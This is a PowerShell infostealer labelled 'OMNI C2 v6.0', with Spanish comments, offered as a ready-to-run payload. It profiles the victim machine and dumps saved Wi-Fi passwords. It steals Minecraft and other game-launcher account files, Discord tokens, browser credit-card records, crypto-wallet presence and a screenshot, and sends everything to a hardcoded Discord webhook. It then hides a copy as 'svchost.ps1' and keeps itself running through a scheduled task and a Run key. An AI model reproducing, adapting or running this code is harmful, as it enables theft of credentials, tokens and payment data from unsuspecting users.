# OMNI C2 v6.0 - PAYLOAD PRINCIPAL (SIN EMOTICONES)

param([string]$WebhookUrl = "https://discord.com/api/webhooks/1510348415148495009/Z2jNquIANWEm9YqLD0dgBmxCj4cMAG8fAtX-1_YukxV2rNwCSBbSwY4meOLj8LqibrRe")

$VictimID = "$env:COMPUTERNAME-$((Get-Random -Maximum 99999))"

function Send-C2 {
    param([string]$Content, [string]$File = $null)
    $body = @{content = "`n[$VictimID]`n$Content"} | ConvertTo-Json
    try {
        if ($File -and (Test-Path $File)) {
            $uri = $WebhookUrl + "?wait=true"
            $form = @{payload_json = $body; file = Get-Item $File}
            Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction SilentlyContinue
        } else {
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Send-FileEx {
    param([string]$Path, [string]$Label)
    if (Test-Path $Path) {
        try {
            $content = Get-Content $Path -Raw -ErrorAction SilentlyContinue -Encoding UTF8
            if ($null -eq $content) { $content = "[BINARIO - $((Get-Item $Path).Length) bytes]" }
            if ($content.Length -gt 1900) { $content = $content.Substring(0, 1900) + "..." }
            Send-C2 -Content "[FILE] $Label`n`n$content"
        } catch {}
    }
}

# === 1. SISTEMA ===
$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
$cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 1)
try { $publicIP = (Invoke-RestMethod "https://api.ipify.org" -TimeoutSec 5 -ErrorAction Stop) } catch { $publicIP = "N/A" }

Send-C2 -Content "NUEVA VICTIMA CONECTADA`nSISTEMA`nPC: $env:COMPUTERNAME`nUsuario: $env:USERNAME`nOS: $($os.Caption) $($os.Version)`nCPU: $($cpu.Name)`nRAM: ${ram}GB`nIP Publica: $publicIP"

# === 2. WIFI ===
$wifiResult = "WIFI`n"
$profiles = netsh wlan show profiles | Select-String "Perfil de todos|All User Profile" | ForEach-Object { $_ -replace '.*:\s+', '' }
foreach ($p in $profiles) {
    try {
        $details = netsh wlan show profile name="$p" key=clear
        $pass = $details | Select-String "Contenido de la clave|Key Content" | ForEach-Object { $_ -replace '.*:\s+', '' }
        if (-not $pass) { $pass = "Sin contrasena" }
        $wifiResult += "$p : $pass`n"
    } catch {}
}
Send-C2 -Content $wifiResult

# === 3. MINECRAFT ===
$mcResult = "MINECRAFT - ROBO`n"

$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_profiles.json",
    "$env:APPDATA\.minecraft\usercache.json",
    "$env:APPDATA\.minecraft\launcher_msa_credentials.json"
)
foreach ($p in $paths) {
    if (Test-Path $p) { 
        $mcResult += "OK $([System.IO.Path]::GetFileName($p))`n"
        Send-FileEx -Path $p -Label "Minecraft - $([System.IO.Path]::GetFileName($p))"
        $data = Get-Content $p -Raw -ErrorAction SilentlyContinue
        if ($data -match '"name"\s*:\s*"([^"]+)"') { $mcResult += "   Usuario: $($matches[1])`n" }
        if ($data -match '"accessToken"\s*:\s*"([^"]+)"') { $mcResult += "   Token presente`n" }
        if ($data -match '"uuid"\s*:\s*"([^"]+)"') { $mcResult += "   UUID: $($matches[1])`n" }
    }
}

foreach ($p in @("$env:APPDATA\.tlauncher\accounts.json","$env:APPDATA\TLauncher\accounts.json")) {
    if (Test-Path $p) { $mcResult += "OK TLauncher`n"; Send-FileEx -Path $p -Label "TLauncher" }
}

$launchers = @(
    @{N="Lunar Client"; P="$env:APPDATA\.lunarclient\settings.json"},
    @{N="Badlion"; P="$env:APPDATA\BadlionClient\accounts.json"},
    @{N="Prism"; P="$env:APPDATA\PrismLauncher\accounts.json"},
    @{N="MultiMC"; P="$env:APPDATA\MultiMC\accounts.json"},
    @{N="ATLauncher"; P="$env:APPDATA\ATLauncher\accounts.json"}
)
foreach ($l in $launchers) {
    if (Test-Path $l.P) { $mcResult += "OK $($l.N)`n"; Send-FileEx -Path $l.P -Label "$($l.N)" }
}

$ssDir = "$env:APPDATA\.minecraft\screenshots"
if (Test-Path $ssDir) { $ss = Get-ChildItem $ssDir -Filter "*.png" -ErrorAction SilentlyContinue; $mcResult += "$($ss.Count) screenshots`n"; foreach ($s in $ss | Select-Object -First 3) { Send-C2 -Content "Screenshot" -File $s.FullName } }

$savesDir = "$env:APPDATA\.minecraft\saves"
if (Test-Path $savesDir) { $worlds = Get-ChildItem $savesDir -Directory -ErrorAction SilentlyContinue; $mcResult += "$($worlds.Count) mundos`n" }

$modsDir = "$env:APPDATA\.minecraft\mods"
if (Test-Path $modsDir) { $mods = Get-ChildItem $modsDir -Filter "*.jar" -ErrorAction SilentlyContinue; $mcResult += "$($mods.Count) mods`n" }

$bedrock = Get-ChildItem "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_*\LocalState\games\com.mojang\" -ErrorAction SilentlyContinue
if ($bedrock) { $mcResult += "Minecraft Bedrock detectado`n" }

Send-C2 -Content $mcResult

# === 4. DISCORD ===
$discResult = "DISCORD`n"
$clients = @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:LOCALAPPDATA\Discord","$env:LOCALAPPDATA\discordcanary","$env:LOCALAPPDATA\discordptb")
$tokens = @()
foreach ($base in $clients) {
    $ldb = "$base\Local Storage\leveldb"
    if (Test-Path $ldb) {
        $files = Get-ChildItem $ldb -Filter "*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try { $content = Get-Content $file.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue; if ($content) { $regex = [regex]'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}'; $m = $regex.Matches($content); foreach ($c in $m) { if ($c.Value -notin $tokens) { $tokens += $c.Value } }; $mfaRegex = [regex]'mfa\.[a-zA-Z0-9_-]{84}'; $mfaM = $mfaRegex.Matches($content); foreach ($c in $mfaM) { if ($c.Value -notin $tokens) { $tokens += $c.Value } } } } catch {}
    }
}
foreach ($bp in @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")) {
    if (Test-Path $bp) { $files = Get-ChildItem $bp -Filter "*.ldb" -ErrorAction SilentlyContinue; foreach ($file in $files) { try { $content = Get-Content $file.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue; if ($content -match '[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}') { if ($matches[0] -notin $tokens) { $tokens += $matches[0] } } } catch {} } }
}
if ($tokens.Count -gt 0) { $discResult += "$($tokens.Count) TOKENS`n"; foreach ($t in $tokens) { $discResult += "Token: $($t.Substring(0,[Math]::Min(50,$t.Length)))...`n" } } else { $discResult += "Sin tokens`n" }
Send-C2 -Content $discResult

# === 5. TARJETAS ===
$cardsResult = "TARJETAS`n"
$browsersCards = @(@{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data"},@{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},@{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"})
$totalCards = 0
foreach ($b in $browsersCards) {
    foreach ($profile in @("Default","Profile 1")) {
        $webData = "$($b.P)\$profile\Web Data"
        if (Test-Path $webData) {
            try {
                $tempDb = "$env:TEMP\wd_$((Get-Random -Maximum 99999)).db"
                Copy-Item $webData $tempDb -Force -ErrorAction SilentlyContinue
                Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Read Only=True")
                $conn.Open()
                $cmd = $conn.CreateCommand()
                $cmd.CommandText = "SELECT name_on_card, expiration_month, expiration_year FROM credit_cards"
                $reader = $cmd.ExecuteReader()
                while ($reader.Read()) { $totalCards++; $cardsResult += "$($reader["name_on_card"]) | $($reader["expiration_month"])/$($reader["expiration_year"]) | $($b.N)`n" }
                $reader.Close(); $conn.Close()
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            } catch {}
        }
    }
}
if ($totalCards -eq 0) { $cardsResult += "Sin tarjetas`n" } else { $cardsResult += "Total: $totalCards tarjetas`n" }
Send-C2 -Content $cardsResult

# === 6. NAVEGADORES ===
$browsResult = "NAVEGADORES`n"
$browsers = @(
    @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
    @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
    @{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
)
foreach ($b in $browsers) { if (Test-Path $b.P) { $size = [math]::Round((Get-Item $b.P).Length/1KB,1); $browsResult += "$($b.N) ($size KB)`n" } }
$ff = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | Select-Object -First 1
if ($ff) { $browsResult += "Firefox ($($ff.Name))`n" }
Send-C2 -Content $browsResult

# === 7. CRIPTO ===
$cryptoResult = "CRIPTO`n"
$wallets = @(
    @{N="MetaMask Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    @{N="Exodus";P="$env:APPDATA\Exodus"},
    @{N="Electrum";P="$env:APPDATA\Electrum"},
    @{N="Coinbase";P="$env:APPDATA\Coinbase"},
    @{N="Binance";P="$env:APPDATA\Binance"}
)
$found = $false
foreach ($w in $wallets) { if (Test-Path $w.P) { $cryptoResult += "$($w.N)`n"; $found = $true } }
if (-not $found) { $cryptoResult += "Sin wallets`n" }
Send-C2 -Content $cryptoResult

# === 8. JUEGOS ===
$gamesResult = "JUEGOS`n"
if (Test-Path "$env:PROGRAMFILES(x86)\Steam") { 
    $gamesResult += "Steam instalado`n"
    $steamLogin = "$env:PROGRAMFILES(x86)\Steam\config\loginusers.vdf"
    if (Test-Path $steamLogin) {
        $content = Get-Content $steamLogin -Raw -ErrorAction SilentlyContinue
        if ($content -match '"AccountName"\s*"([^"]+)"') { $gamesResult += "   Steam: $($matches[1])`n" }
    }
}
if (Test-Path "$env:LOCALAPPDATA\EpicGamesLauncher") { $gamesResult += "Epic Games instalado`n" }
if (Test-Path "$env:LOCALAPPDATA\Riot Games") { $gamesResult += "Riot Games (LoL/Valorant) instalado`n" }
if (Test-Path "$env:APPDATA\Spotify") { $gamesResult += "Spotify instalado`n" }
if (Test-Path "$env:APPDATA\Telegram Desktop") { $gamesResult += "Telegram Desktop instalado`n" }
Send-C2 -Content $gamesResult

# === 9. CAPTURA DE PANTALLA ===
try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $tempFile = "$env:TEMP\ss_$((Get-Random -Maximum 99999)).png"
    $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose(); $bitmap.Dispose()
    Send-C2 -Content "Captura de pantalla" -File $tempFile
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
} catch {}

# === 10. PERSISTENCIA ===
try {
    $persistPath = "$env:APPDATA\Microsoft\Windows\svchost.ps1"
    $currentScript = Get-Content $PSCommandPath -Raw -ErrorAction SilentlyContinue
    if ($currentScript) { Set-Content -Path $persistPath -Value $currentScript -Force; $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistPath`""; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName "WindowsBgSvc" -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue; Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsBgSvc" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistPath`"" -Force }
    Send-C2 -Content "Persistencia instalada"
} catch { Send-C2 -Content "Error persistencia: $_" }

# === 11. FIN ===
Send-C2 -Content "EXTRACCION COMPLETA"
while ($true) { Start-Sleep -Seconds 60 }
